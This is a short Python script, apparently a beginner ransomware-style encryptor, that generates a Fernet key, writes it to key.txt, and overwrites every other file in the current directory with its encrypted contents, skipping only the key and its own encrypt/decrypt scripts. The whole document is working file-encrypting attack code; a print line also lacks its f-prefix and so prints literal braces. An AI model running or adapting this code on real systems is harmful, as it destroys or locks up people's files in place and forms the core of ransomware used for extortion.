import os
from cryptography.fernet import Fernet


files = os.listdir()
key = Fernet.generate_key()

with open("key.txt", "wb") as file:
  file.write(key)


  

#print(dir(Fernet), "\n")
#help(Fernet)  

for file in files:
  if file == "key.txt" or file == "encrypt.py" or file == "decrypt.py" or file == "__pycache__":
    continue
  with open (file, "rb") as f:
    data = f.read()
    encrypt = Fernet(key).encrypt(data)
  with open(file, "wb") as f:
    f.write(encrypt)
    print("Files {files} encrypted successfully")